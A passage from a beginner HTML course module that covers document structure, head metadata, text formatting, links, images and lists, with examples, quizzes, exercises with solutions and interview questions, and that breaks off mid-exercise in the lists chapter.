---
id: html
title: HTML
icon: 🌐
track: Programming
color: #E34F26
runner: html
tagline: The structure of every web page, EPUB and WeasyPrint report.
description: HTML from the first tag to expert-level semantics: document structure, text, links, images, lists, tables, forms, semantic elements, accessibility, SEO, media, iframes, and the XHTML strictness that EPUB3 and PDF-from-HTML tools require.
---

# LEVEL: Beginner

## Introduction & your first page

HTML (HyperText Markup Language) is the language every web page, every EPUB chapter and every WeasyPrint PDF report is written in. It is not a programming language: it does not calculate or decide anything. It **marks up** text so that a browser, an e-reader or a PDF engine knows which part is a heading, which part is a paragraph and which part is a link.

You write HTML in a plain text file with the extension `.html` (or `.xhtml` for EPUB). Any editor works: Notepad, VS Code, even the Fiverr message box if you are desperate. There is nothing to install, because the browser you already have is the interpreter.

### Tags, elements and attributes

HTML is made of **tags** wrapped in angle brackets. Most tags come in pairs, an opening tag and a closing tag with a slash, and everything between them is the **element**:

```html
<p>Stewart Title weekly production report</p>
```

Here `<p>` opens a paragraph, `</p>` closes it, and the whole line is one paragraph element. Some elements carry extra information in **attributes**, written as `name="value"` inside the opening tag:

```html
<a href="https://www.fiverr.com">Visit Fiverr</a>
```

The `href` attribute tells the link where to go. Attribute values should always be in double quotes. That habit matters later, because EPUB and XHTML refuse unquoted values.

| Piece | Example | What it is |
|---|---|---|
| Opening tag | `<p>` | Starts the element |
| Content | `Weekly report` | Text or nested elements |
| Closing tag | `</p>` | Ends the element |
| Attribute | `href="..."` | Extra setting on the opening tag |
| Void element | `<br>` | Has no closing tag and no content |

### Your first complete page

Save the following as `first.html`, then double-click it. Your browser opens it as a page.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>My first page</title>
</head>
<body>
  <p>Hello, I am Ali. I build documents for a living.</p>
</body>
</html>
```

Line by line: `<!DOCTYPE html>` tells the browser this is modern HTML5. `<html>` wraps everything. `<head>` holds information *about* the page (its title, its character set). `<body>` holds what you actually see. The `<title>` text appears in the browser tab, not on the page itself.

### Nesting and indentation

Elements sit inside other elements, like folders inside folders. The rule is simple: close the inner element before you close the outer one. `<p><strong>bold</strong></p>` is correct; `<p><strong>bold</p></strong>` is wrong. Browsers forgive that mistake silently, but an EPUB validator will reject the whole book because of it, so learn the habit now.

Indentation (the two spaces before `<meta>` above) is only for humans. The browser ignores extra spaces and line breaks between elements, and it collapses runs of spaces inside text into one. This is why a paragraph you typed on five lines shows up as one flowing paragraph.

> **Tip:** Press F12 in Chrome or Edge to open DevTools, then look at the *Elements* tab. It shows the tree the browser built from your file, which is the fastest way to see where you forgot a closing tag.

### Comments

Anything between `<!--` and `-->` is a comment. It is not displayed, but it *is* sent to the reader, so never leave client names or passwords in comments.

```html
<!-- Section 3 of the policy manual starts here -->
```

You now know the whole grammar of HTML: elements, attributes, nesting, void elements and comments. Everything that follows is vocabulary.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>My first page</title>
</head>
<body>
  <p>Hello, I am Ali. I build <strong>documents</strong> for a living.</p>
  <p>Change this text, then press Run to see the result.</p>
  <!-- This comment does not appear on the page -->
</body>
</html>
```

### Quiz

1. Which part of `<a href="x.html">Go</a>` is the attribute?
- [ ] `<a>`
- [x] `href="x.html"`
- [ ] `Go`
> Attributes are `name="value"` pairs inside the opening tag. `Go` is the content and `<a>` is the tag.

2. What does `<!DOCTYPE html>` do?
- [ ] Loads the HTML library
- [x] Tells the browser to use modern HTML5 rendering rules
- [ ] Creates the first heading
> Without a doctype, browsers fall back to "quirks mode", an emulation of 1990s bugs.

3. Where does the text inside `<title>` appear?
- [ ] At the top of the page body
- [x] In the browser tab and in bookmarks
- [ ] Nowhere, it is a comment
> `<title>` lives in `<head>`, which describes the page rather than showing content.

4. Which is correctly nested?
- [x] `<p><em>hello</em></p>`
- [ ] `<p><em>hello</p></em>`
- [ ] `<p><em>hello</p>`
> The inner element must close before the outer one closes.

### Exercises

1. **Business card page** — Create a page whose tab says "Ali Raza" and whose body has two paragraphs: your job title and your city.
<details><summary>Solution</summary>

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Ali Raza</title>
</head>
<body>
  <p>Document Production &amp; Automation Specialist</p>
  <p>Lahore, Pakistan</p>
</body>
</html>
```

</details>

2. **Find the bug** — This snippet renders oddly: `<p>Rate <strong>matrix</p></strong>`. Fix it and explain why the browser still showed something.
<details><summary>Solution</summary>

```html
<p>Rate <strong>matrix</strong></p>
```

The tags overlap instead of nesting. Browsers run an error-recovery algorithm that closes `<strong>` for you, which is why it "worked", but EPUB and XHTML parsers stop with an error.

</details>

### Interview Questions

**Q: Is HTML a programming language?**
No. HTML is a markup language: it describes the structure and meaning of content but has no variables, loops or conditions. Programming happens in JavaScript in the browser or in Python on the server, and both of them produce or manipulate HTML. A strong answer adds that HTML is nevertheless a formal language with a specification (the WHATWG HTML Living Standard) and a well-defined parsing algorithm, so "not a programming language" does not mean "anything goes". For example, I generate hundreds of report pages from Jinja2 templates, and the HTML they emit still has to be structurally valid for WeasyPrint to paginate it correctly.

**Q: What is the difference between an element and a tag?**
A tag is the literal text in angle brackets, such as `<p>` or `</p>`. An element is the whole thing the tags define: the opening tag, its attributes, its content and the closing tag, plus the node the browser creates in the DOM. Void elements like `<img>` and `<br>` are elements with only one tag. Interviewers use this question to check whether you think in terms of the document tree rather than the text file.

**Q: Why do we still write a DOCTYPE if HTML5 has only one?**
Because the doctype is what switches the browser into standards mode. Without it, browsers deliberately reproduce old Internet Explorer behaviour called quirks mode, where the box model and table sizing differ. `<!DOCTYPE html>` is the shortest string that triggers standards mode in every browser, which is why HTML5 chose it. In XHTML files for EPUB the doctype is optional but the XML declaration and the `xmlns` attribute are required instead.

## Document structure: doctype, head, body & meta

A page is only useful to a browser if it can find three things quickly: what version of HTML this is, information *about* the document, and the visible content. That is the job of `<!DOCTYPE>`, `<head>` and `<body>`. Get this skeleton right once and every page, EPUB chapter and report template you write later starts from it.

### The root element and language

```html
<!DOCTYPE html>
<html lang="en">
  <head>…</head>
  <body>…</body>
</html>
```

`<html>` is the **root**: exactly one, containing exactly one `<head>` and one `<body>`. The `lang` attribute is not decoration. Screen readers use it to pick a voice, WeasyPrint uses it to choose hyphenation rules, Google uses it for language targeting, and EPUB readers use it to select a dictionary. Use `lang="en"` for English or `lang="ur"` for Urdu content.

### What goes in the head

The head is metadata: nothing in it is rendered as content. The most common children are shown below, in the order you should write them.

| Element | Purpose | Example |
|---|---|---|
| `<meta charset>` | Character encoding; put it first | `<meta charset="UTF-8">` |
| `<meta name="viewport">` | Mobile scaling | `content="width=device-width, initial-scale=1"` |
| `<title>` | Tab text, bookmark name, search result headline | `<title>Weekly Production Report</title>` |
| `<meta name="description">` | Search snippet | `content="Title orders processed…"` |
| `<link rel="stylesheet">` | Attach a CSS file | `href="report.css"` |
| `<link rel="icon">` | Favicon | `href="favicon.png"` |
| `<script>` | Attach JavaScript | `src="app.js" defer` |
| `<style>` | Inline CSS | Used by WeasyPrint templates |

A complete, production-quality head looks like this:

```html
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Weekly Production Report – Week 37</title>
  <meta name="description" content="Title orders processed by state, week 37 of 2026.">
  <link rel="stylesheet" href="report.css">
  <script src="app.js" defer></script>
</head>
```

Why `charset` first? The browser starts guessing the encoding from the first bytes. If `charset` appears after 1024 bytes of other content, some browsers have already guessed wrong and you get `Ã©` instead of `é`. UTF-8 handles English, Urdu, Arabic and the curly quotes Word pastes in, so there is no reason to use anything else.

### What goes in the body

Everything the reader sees lives in `<body>`. A minimal report body:

```html
<body>
  <header><h1>Weekly Production Report</h1></header>
  <main>
    <p>Total orders processed: 412.</p>
  </main>
  <footer><p>Prepared by Ali Raza, Production Support.</p></footer>
</body>
```

You will learn `<header>`, `<main>` and `<footer>` properly in the semantic elements chapter. For now, notice that the body is a tree: `<main>` contains `<p>`, and `<body>` contains `<main>`.

### Where scripts and styles go

CSS belongs in the head, because the browser should know how things look before it draws them. Scripts traditionally went at the end of the body so the content could render first; today the modern pattern is `<script src="…" defer>` in the head, which downloads in parallel and runs after parsing. For WeasyPrint and EPUB, scripts are ignored or forbidden, so keep report templates script-free and put all CSS in `<style>` or a linked file.

> **Warning:** A page with two `<body>` elements or a `<title>` inside `<body>` will still "work" in Chrome because of error recovery. It will *not* work in an EPUB, and epubcheck will list every one of those errors. Write the skeleton correctly from day one.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Weekly Production Report – Week 37</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 2rem; }
    footer { color: #666; font-size: 0.9em; }
  </style>
</head>
<body>
  <header><h1>Weekly Production Report</h1></header>
  <main>
    <p>Total orders processed: 412.</p>
    <p>Rate calculators updated: 3 (TX, FL, WY).</p>
  </main>
  <footer><p>Prepared by Ali Raza, Production Support.</p></footer>
</body>
</html>
```

### Quiz

1. Which element must be the first child of `<head>` for safe encoding detection?
- [x] `<meta charset="UTF-8">`
- [ ] `<title>`
- [ ] `<link rel="stylesheet">`
> Browsers sniff the first 1024 bytes for the charset, so declare it before anything else.

2. Where should `<link rel="stylesheet">` go?
- [ ] End of `<body>`
- [x] Inside `<head>`
- [ ] Before `<!DOCTYPE>`
> Stylesheets in the head are loaded before content paints, avoiding a flash of unstyled content.

3. What does `lang="en"` on `<html>` affect?
- [ ] Only the font
- [x] Screen-reader voice, hyphenation, search language targeting
- [ ] Nothing; it is optional metadata with no effect
> Assistive technology, PDF engines and search engines all read the document language.

4. What does the `defer` attribute on `<script>` do?
- [x] Downloads now, runs after the document is parsed
- [ ] Prevents the script from running
- [ ] Runs the script before CSS loads
> `defer` keeps the parser moving and guarantees the DOM exists when the script runs.

### Exercises

1. **Report skeleton** — Write the head of a page titled "Rate Matrix – Texas" with a UTF-8 charset, a viewport tag and a description meta tag.
<details><summary>Solution</summary>

```html
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Rate Matrix – Texas</title>
  <meta name="description" content="Owner and lender title insurance premium rates for Texas, effective 2026.">
</head>
```

</details>

2. **Spot the errors** — List what is wrong: `<html><body><title>Hi</title><p>Text</body><p>More</p></html>`.
<details><summary>Solution</summary>

Missing `<!DOCTYPE html>` and `lang`; no `<head>`; `<title>` is inside `<body>`; the first `<p>` is never closed; a `<p>` appears after `</body>`; no `<meta charset>`. Corrected:

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Hi</title></head>
<body><p>Text</p><p>More</p></body>
</html>
```

</details>

### Interview Questions

**Q: What happens if you omit `<html>`, `<head>` and `<body>`?**
The HTML5 parser inserts them for you, because the tree-construction algorithm has "implied" insertion points: the first non-whitespace token that is not allowed before `<html>` causes an `<html>` element to be created, and so on for head and body. So `<!DOCTYPE html><title>x</title><p>y</p>` is actually a conforming document. I still write them explicitly, because XHTML (EPUB) has no implied elements and because explicit structure is what your teammates and templates depend on. The interviewer wants to hear that you know the parser is forgiving *and* that you do not rely on it.

**Q: Why should the viewport meta tag be present on every page?**
Mobile browsers assume a legacy page is 980px wide and zoom it out to fit, which makes text unreadable. `<meta name="viewport" content="width=device-width, initial-scale=1">` tells the browser to use the real device width and no initial zoom, so CSS media queries and responsive layouts work. Without it, a responsive stylesheet is never triggered on phones. For print-only templates rendered by WeasyPrint it has no effect, but including it costs nothing.

**Q: Explain the difference between `<script defer>`, `<script async>` and a plain `<script>`.**
A plain external script blocks parsing: the browser stops building the DOM, downloads the file, executes it, then continues. `async` downloads in parallel and executes as soon as it arrives, still pausing the parser at that moment and with no ordering guarantee between scripts, which suits analytics tags. `defer` downloads in parallel but executes after parsing finishes, in document order, before `DOMContentLoaded`, which suits application code that touches the DOM. Module scripts (`type="module"`) are deferred by default. If a script needs the DOM, `defer` is the right default.

## Headings, paragraphs & text formatting

Most of any document is text, so the text elements are the ones you will type most often. HTML gives you six heading levels, a paragraph element, line breaks, and a small set of inline elements that add *meaning* (not just looks) to a phrase.

### The six heading levels

| Element | Typical use in a handbook | Rule |
|---|---|---|
| `h1` | Document title | One per page or chapter |
| `h2` | Chapter or major section | Follows an h1 |
| `h3` | Sub-section | Follows an h2 |
| `h4`–`h6` | Deeper sub-sections | Rarely needed beyond h4 |

Headings form an **outline**, exactly like the Heading 1/2/3 styles that build an automatic table of contents in Word. Never skip a level (h1 straight to h3) and never choose a heading because of its size; size is CSS's job.

```html
<article>
  <header><h1>Employee Handbook</h1></header>
  <section><h2>1. Leave Policy</h2>
    <p>All full-time staff accrue 1.5 days of annual leave per month.</p>
    <section><h3>1.1 Carry-over</h3>
      <p>Up to 10 unused days may be carried into the next calendar year.</p>
    </section>
  </section>
</article>
```

Screen readers let users jump between headings with a single key, and EPUB readers build the navigation document from them. A 767-page handbook with a correct heading outline gets a working TOC for free; one with bold paragraphs pretending to be headings gets nothing.

### Paragraphs and line breaks

`<p>` is a block of text with space above and below. Do not use empty `<p></p>` elements to create vertical space; that is what CSS margins are for. Inside a paragraph, a `<br>` forces a line break without starting a new paragraph, which is right for postal addresses and poems and wrong for almost everything else.

```html
<p>Stewart Title Guaranty Company<br>
1980 Post Oak Blvd<br>
Houston, TX 77056</p>
```

`<hr>` draws a thematic break, a horizontal rule that means "the topic changes here". Both `<br>` and `<hr>` are void elements: no closing tag in HTML, and `<br/>` in XHTML.

### Inline formatting with meaning

| Element | Meaning | Looks like |
|---|---|---|
| `<strong>` | Important, serious, urgent | **bold** |
| `<em>` | Stress emphasis, changes the sentence's meaning | *italic* |
| `<b>` | Attention without extra importance (keywords, product names) | bold |
| `<i>` | Alternate voice: technical terms, ship names, foreign phrases | italic |
| `<mark>` | Highlighted for reference | yellow background |
| `<small>` | Side comment, legal fine print | smaller |
| `<sub>` / `<sup>` | Subscript / superscript | H<sub>2</sub>O, 1<sup>st</sup> |
| `<code>` | A fragment of computer code | monospace |
| `<abbr>` | Abbreviation with a `title` explaining it | dotted underline |
| `<time>` | A date or time with a machine-readable `datetime` | plain |

```html
<p><strong>Warning:</strong> submit the <abbr title="Closing Disclosure">CD</abbr>
no later than <time datetime="2026-09-18">18 September</time>.
The <em>original</em> signed copy, not a scan, is required.</p>
```

The difference between `<strong>` and `<b>` matters to screen readers and to search engines, not to the eye. Use `<strong>` when removing the emphasis would change the seriousness; use `<b>` for a product name you simply want to stand out.

### Preformatted text and quotations

`<pre>` preserves whitespace and line breaks exactly, which you need for code listings or fixed-width rate tables pasted from a mainframe export. `<blockquote>` marks a long quotation with an optional `cite` attribute; `<q>` marks a short inline quotation and the browser adds the quotation marks.

```html
<blockquote cite="https://example.com/sop-14">
  <p>Every file must be quality-checked by a second agent before release.</p>
</blockquote>
<p>The SOP says <q>every file</q>, so no exceptions for rush orders.</p>
```

> **Interview note:** "What is the difference between `<b>` and `<strong>`?" is one of the most common junior HTML questions. The answer is *semantics*: `<strong>` conveys importance to assistive technology and search engines; `<b>` is purely stylistic. The same logic applies to `<i>` versus `<em>`.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Text elements</title></head>
<body>
  <h1>Employee Handbook</h1>
  <h2>1. Leave Policy</h2>
  <p>All full-time staff accrue <strong>1.5 days</strong> of annual leave per month.
     Requests must be filed <em>before</em> the leave starts.</p>
  <h3>1.1 Carry-over</h3>
  <p>Up to <mark>10 unused days</mark> may be carried over. See the
     <abbr title="Human Resources">HR</abbr> portal. Updated
     <time datetime="2026-09-01">1 September 2026</time>.</p>
  <hr>
  <p>Head Office<br>Gulberg III<br>Lahore</p>
  <blockquote><p>Every file must be quality-checked by a second agent.</p></blockquote>
  <p><small>Version 4.2. Internal use only.</small></p>
</body>
</html>
```

### Quiz

1. How many `<h1>` elements should a typical page or chapter have?
- [x] One
- [ ] As many as there are sections
- [ ] None; use `<title>` instead
> One h1 per page keeps the outline meaningful for screen readers and TOC generators.

2. Which element means "this phrase is important"?
- [ ] `<b>`
- [x] `<strong>`
- [ ] `<mark>`
> `<strong>` carries semantic importance; `<b>` only draws the eye.

3. Which element preserves spaces and line breaks exactly as typed?
- [ ] `<p>`
- [ ] `<blockquote>`
- [x] `<pre>`
> `<pre>` is preformatted text; browsers collapse whitespace everywhere else.

4. What is the correct way to write a superscript "2" in "m2"?
- [x] `m<sup>2</sup>`
- [ ] `m<sub>2</sub>`
- [ ] `m^2`
> `<sup>` raises text; `<sub>` lowers it.

### Exercises

1. **SOP outline** — Mark up an SOP with the title "Quality Check Procedure", two sections ("Scope", "Steps") and one sub-section under Steps ("Escalation"), each with one paragraph.
<details><summary>Solution</summary>

```html
<h1>Quality Check Procedure</h1>
<h2>Scope</h2>
<p>Applies to all title-search files released to US clients.</p>
<h2>Steps</h2>
<p>The checker opens the file, verifies legal description, vesting and liens.</p>
<h3>Escalation</h3>
<p>Discrepancies above two per file go to the team lead the same day.</p>
```

</details>

2. **Semantic emphasis** — Rewrite `<b>Do not</b> share client <i>PII</i>` using elements that carry meaning, and explain `PII`.
<details><summary>Solution</summary>

```html
<p><strong>Do not</strong> share client <abbr title="Personally Identifiable Information">PII</abbr>.</p>
```

"Do not" is a real warning, so `<strong>`; PII is an abbreviation, so `<abbr>` with a `title`.

</details>

### Interview Questions

**Q: What is the difference between `<em>` and `<i>`?**
`<em>` marks stress emphasis: it changes how the sentence should be read, and screen readers may change intonation. `<i>` marks text in an alternate voice or mood without adding emphasis: a Latin term, a ship name, a thought, a technical term being defined. Both render italic by default, so the visual result is identical; the semantic difference is what search engines and assistive technology consume. In a legal handbook I would put defined terms in `<i>` (or better, `<dfn>`) and a genuine warning in `<strong>`.

**Q: Why is skipping heading levels considered a bug?**
Headings define the document outline, and assistive technology exposes that outline as a navigable tree. Jumping from h1 to h3 makes the user think a section is missing. Automated tools such as epubcheck, axe and Lighthouse flag it, and EPUB navigation documents built from headings become lopsided. Interviewers also want to hear that heading level is about structure, never size; if the h2 is too big, change the CSS rather than the element.

**Q: When is `<br>` appropriate?**
Only when the line break is part of the content: postal addresses, poetry, song lyrics and signature blocks. It is wrong for spacing between paragraphs or for laying out a form, because those breaks are presentation and belong in CSS. A quick test is to ask whether a screen reader user loses meaning if the break disappears; for an address the answer is yes, for spacing the answer is no. In WeasyPrint templates I use CSS `margin-bottom` for spacing and reserve `<br>` for the letterhead address block.

## Links & images

Links are what make hypertext *hyper*, and images are the first thing a client notices in a deliverable. Both are one-element jobs, but each has attributes that separate a professional page from an amateur one.

### The anchor element

```html
<a href="https://www.stewart.com/">Stewart Title</a>
```

`<a>` is the anchor. `href` is the destination, and the content between the tags is what the user clicks. The content can be text, an image or even a whole card of elements. Destinations come in several forms:

| `href` value | Meaning |
|---|---|
| `https://example.com/page` | Absolute URL to another site |
| `/reports/week-37.html` | Root-relative path on the same site |
| `week-37.html` | Relative to the current folder |
| `../index.html` | One folder up |
| `#leave-policy` | Jump to the element with `id="leave-policy"` on this page |
| `chapter2.xhtml#s3` | Another file, then jump to an anchor inside it |
| `mailto:ali@example.com` | Opens the email client |
| `tel:+923001234567` | Dials on a phone |

In-page anchors are how a table of contents works in an EPUB or a WeasyPrint PDF: give each heading an `id`, then link to it.

```html
<nav>
  <a href="#scope">Scope</a> · <a href="#steps">Steps</a>
</nav>
<section id="scope"><h2>Scope</h2><p>…</p></section>
<section id="steps"><h2>Steps</h2><p>…</p></section>
```

### Opening in a new tab, safely

`target="_blank"` opens a new tab. Always pair it with `rel="noopener"` (modern browsers imply it, but be explicit), otherwise the new page can access `window.opener` and redirect your original tab. Add `rel="nofollow"` for untrusted user-submitted links and `download` to force a file download instead of navigation.

```html
<a href="handbook.pdf" download="Employee-Handbook-2026.pdf">Download the handbook (PDF, 4 MB)</a>
<a href="https://upwork.com/" target="_blank" rel="noopener">Upwork profile</a>
```

Good link text describes the destination: "Download the handbook" not "click here". Screen reader users often tab through links out of context, and a page full of "click here" is useless to them.

### The image element

```html
<img src="charts/orders-by-state.png" alt="Bar chart: Texas 180 orders, Florida 122, Wyoming 41" width="640" height="360">
```

`<img>` is a void element with four attributes you should always set:

- `src`: the path or URL of the file.
- `alt`: text describing the image for people who cannot see it and for the moment before it loads. If the image is purely decorative, use `alt=""` (empty, but present) so screen readers skip it.
- `width` and `height`: the intrinsic size in pixels. The browser reserves the space before the image downloads, so the page does not jump. CSS can still scale it.

Supported formats are JPEG (photos), PNG (screenshots, transparency), SVG (logos, icons, scales perfectly), WebP and AVIF (smaller modern formats), and GIF (simple animation). For a print-ready PDF cover use PNG or SVG; JPEG artefacts show at 300 dpi.

### Figures with captions

When an image needs a caption, wrap it in `<figure>` with a `<figcaption>`. Report generators and EPUB readers treat the pair as one unit.

```html
<figure>
  <img src="rate-matrix-tx.png" alt="Texas rate matrix, policy amounts $0–$100,000 in $5,000 steps" width="800" height="500">
  <figcaption>Figure 2. Texas owner's policy rate matrix, effective 1 July 2026.</figcaption>
</figure>
```

### Images as links

Put the `<img>` inside the `<a>` and the whole picture becomes clickable. The alt text then doubles as the link text, so it must say where the link goes.

```html
<a href="/"><img src="logo.svg" alt="Ali Raza Documents – home" width="160" height="40"></a>
```

> **Warning:** Relative paths are resolved from the *HTML file's* location, not from where the image sits. When a Fiverr client says "the images are broken", nine times out of ten they moved the HTML file into another folder. Root-relative paths (`/img/logo.svg`) survive that; plain relative paths do not.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Links and images</title>
<style> body{font-family:Arial,sans-serif;margin:2rem} figure{margin:1rem 0} </style></head>
<body>
  <nav>
    <a href="#scope">Scope</a> · <a href="#chart">Chart</a> ·
    <a href="https://www.fiverr.com/" target="_blank" rel="noopener">Fiverr</a> ·
    <a href="mailto:ali@example.com">Email me</a>
  </nav>
  <h1>Weekly report</h1>
  <section id="scope">
    <h2>Scope</h2>
    <p>Orders received by the Texas, Florida and Wyoming production desks.</p>
  </section>
  <figure id="chart">
    <img src="https://placehold.co/480x200/E34F26/white?text=Orders+by+State"
         alt="Bar chart: Texas 180 orders, Florida 122, Wyoming 41" width="480" height="200">
    <figcaption>Figure 1. Orders by state, week 37.</figcaption>
  </figure>
  <p><a href="#scope">Back to top</a></p>
</body>
</html>
```

### Quiz

1. Which attribute holds a link's destination?
- [ ] `src`
- [x] `href`
- [ ] `link`
> `href` (hypertext reference) is on `<a>`; `src` is on `<img>` and `<script>`.

2. What does `alt=""` mean on an image?
- [ ] The image is broken
- [x] The image is decorative and screen readers should skip it
- [ ] The alt text is required and missing
> An empty but present `alt` marks decoration; a *missing* `alt` makes screen readers announce the file name.

3. Why add `rel="noopener"` with `target="_blank"`?
- [x] So the opened page cannot control the original tab through `window.opener`
- [ ] To make the link open faster
- [ ] To hide the link from search engines
> Without it, the new page could navigate your tab to a phishing site.

4. Which `href` jumps to `<h2 id="steps">` on the same page?
- [ ] `href="steps"`
- [x] `href="#steps"`
- [ ] `href="id=steps"`
> A fragment identifier starts with `#` and matches an element's `id`.

### Exercises

1. **Downloadable deliverable** — Write a link that downloads `handbook-v4.pdf` and saves it as `Employee-Handbook.pdf`, with descriptive link text including the file type and size.
<details><summary>Solution</summary>

```html
<a href="handbook-v4.pdf" download="Employee-Handbook.pdf">Download the Employee Handbook (PDF, 3.8 MB)</a>
```

</details>

2. **Captioned chart** — Mark up a PNG chart `kpi.png` (600×300) with a meaningful alt text and the caption "Figure 3. Agent QA scores, August 2026".
<details><summary>Solution</summary>

```html
<figure>
  <img src="kpi.png" alt="Line chart of agent QA scores rising from 88% to 94% during August 2026" width="600" height="300">
  <figcaption>Figure 3. Agent QA scores, August 2026.</figcaption>
</figure>
```

</details>

3. **Fix the paths** — A page at `/site/reports/week37.html` shows `<img src="img/logo.png">` but the logo lives at `/site/img/logo.png`. Give two correct `src` values.
<details><summary>Solution</summary>

`src="../img/logo.png"` (relative, one folder up) or `src="/site/img/logo.png"` (root-relative).

</details>

### Interview Questions

**Q: What makes good alt text?**
Alt text replaces the image for someone who cannot see it, so it should convey the same information, not describe pixels. For a chart, state the takeaway ("Texas leads with 180 orders; Wyoming trails at 41"); for a logo that links home, say where it goes; for decoration, use an empty `alt=""`. Avoid starting with "image of", because screen readers already announce it as an image. Keep it under roughly 125 characters and put longer descriptions in a `<figcaption>` or adjacent text. Missing alt is a WCAG failure and an epubcheck warning, so I treat it as a required attribute in every template.

**Q: Why should `width` and `height` be set on images when CSS controls the layout anyway?**
The browser uses the attributes to compute the aspect ratio before the file downloads and reserves the correct space, which prevents layout shift, a Core Web Vitals metric. CSS `width: 100%; height: auto` still scales the image responsively because modern browsers map the attributes to an `aspect-ratio` hint rather than a fixed size. In WeasyPrint the attributes also give the engine the intrinsic size for pagination when the image is slow to decode.

**Q: How would you build an in-document table of contents that works in HTML, EPUB and PDF?**
Give every heading a stable `id`, then write a `<nav>` of `<a href="#id">` links. In HTML the browser scrolls; in EPUB3 the same links work inside a chapter, and cross-chapter links use `file.xhtml#id`; in WeasyPrint the links become PDF internal links, and CSS `target-counter(attr(href), page)` can print the page number next to each entry. I generate the ids from heading text with a slugify function so that regenerating the document does not break links. The key point is that one HTML structure serves all three outputs.

## Lists

Lists are everywhere in business documents: procedure steps, requirement checklists, glossaries, navigation menus. HTML has three list types, and choosing the right one is a semantic decision that affects how screen readers announce the content and how Word-to-HTML converters (and HTML-to-DOCX converters) map it back to list styles.

### Unordered lists

Use `<ul>` when the order does not matter. Each item is an `<li>`; `<li>` is the *only* thing allowed directly inside `<ul>`.

```html
<ul>
  <li>Government-issued photo ID</li>
  <li>Proof of address</li>
  <li>Signed engagement letter</li>
</ul>
```

Browsers show bullets by default. Removing or restyling the bullets is done with CSS `list-style`, never by switching to a different element.

### Ordered lists

Use `<ol>` when the sequence matters: steps in an SOP, ranked results, legal clauses. Attributes give you control over numbering.

| Attribute | Effect | Example |
|---|---|---|
| `start` | First number | `<ol start="5">` |
| `reversed` | Count down | `<ol reversed>` |
| `type` | Marker style: `1`, `a`, `A`, `i`, `I` | `<ol type="a">` |
| `value` (on `li`) | Override one item's number | `<li value="10">` |

```html
<ol type="I">
  <li>Open the file in the title plant.</li>
  <li>Verify the legal description against the deed.</li>
  <li>Record liens and judgments.</li>
  <li>Release to the quality checker.</li>
</ol>
```

That renders as I, II, III, IV. For a handbook that continues numbering across a page break in WeasyPrint, `start` is your friend.

### Nested lists

A list can contain another list, but the inner list must go *inside* an `<li>`, after that item's text, never directly inside the `<ul>`.

```html
<ol>
  <li>Prepare the search package
    <ul>
      <li>Vesting deed</li>
      <li>Open mortgages</li>
    </ul>
  </li>
  <li>Run the quality check</li>
</ol>
```

Getting this wrong is the single most common list error in converted Word documents, and epubcheck reports it as "element ul not allowed here".

### Description lists

`<dl>` pairs terms with descriptions: glossaries, metadata blocks, key-value summaries on a report cover. Each term is a `<dt>` and each description a `<dd>`; one term can have several descriptions and vice versa.

```html
<dl>
  <dt>Order number</dt>
  <dd>TX-2026-041877</dd>
  <dt>Policy type</dt>
  <dd>Owner's policy</dd>
  <dd>Lender's policy (simultaneous issue)</dd>
  <dt>Prepared by</dt>
  <dd>Ali Raza</dd>
</dl>
```

A description list is far better than a two-column table for this kind of data, because a table implies rows of comparable records, whereas a `<dl>` says "here are properties of one thing".

### Lists as navigation

Menus are lists of links. Wrapping the list in `<nav>` tells assistive technology it is site navigation, and screen readers announce "list, 4 items" so the user knows how much is there.

```html
<nav aria-label="Main">
  <ul>
    <li><a href="/">Home</a></li>
    <li><a href="/services/">Services</a></li>
    <li><a href="/portfolio/">Portfolio</a></li>
    <li><a href="/contact/">Contact</a></li>
  </ul>
</nav>
```

> **Tip:** When you convert a DOCX to HTML with Pandoc or Mammoth, Word's "List Paragraph" style with manual numbers becomes plain `<p>` elements, not `<ol>`. Fix the source document to use real Word list styles first; you get proper `<ol>`/`<ul>` output and a correct EPUB for free.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Lists</title>
<style>body{font-family:Arial,sans-serif;margin:2rem} dt{font-weight:bold} dd{margin:0 0 .5rem 1rem}</style></head>
<body>
  <h1>Title Search SOP</h1>
  <h2>Required documents</h2>
  <ul>
    <li>Vesting deed</li>
    <li>Open mortgages</li>
    <li>Tax certificate</li>
  </ul>
  <h2>Procedure</h2>
  <ol type="I">
    <li>Open the file in the plant.
      <ul><li>Note the county and parcel number.</li></ul>
    </li>
    <li>Verify the legal description.</li>
    <li value="5">Release to QC (steps III–IV skipped for rush files).</li>
  </ol>
  <h2>File summary</h2>
  <dl>
    <dt>Order number</dt><dd>TX-2026-041877</dd>
    <dt>Policy type</dt><dd>Owner's policy</dd><dd>Lender's policy</dd>
  </dl>
</body>
</html>
```

### Quiz

1. Which element is the only allowed direct child of `<ul>`?
- [x] `<li>`
- [ ] `<p>`
- [ ] `<ul>`
> Nested lists must sit inside an `<li>`, not directly inside the parent list.

2. Which list should hold the steps of a procedure?
- [ ] `<ul>`
- [x] `<ol>`
- [ ] `<dl>`
> Steps have a meaningful sequence, which is exactly what an ordered list conveys.

3. In a `<dl>`, which element holds the definition or value?
- [ ] `<dt>`
- [x] `<dd>`
- [ ] `<li>`
> `<dt>` is the term, `<dd>` the description.

4. How do you start an ordered list at 10?
- [ ] `<ol begin="10">`
- [x] `<ol start="10">`
- [ ] `<ol value="10">`
> `start` is on the list; `value` overrides a single `<li>`.

### Exercises

1. **Glossary** — Mark up a two-term glossary: "AcroForm: the PDF form technology using fields" and "EPUB: the open ebook format".
<details><summary>Solution</summary>

```html
<dl>
  <dt>AcroForm</dt>
  <dd>The PDF form technology that stores fillable fields inside the document.</dd>
  <dt>EPUB</dt>
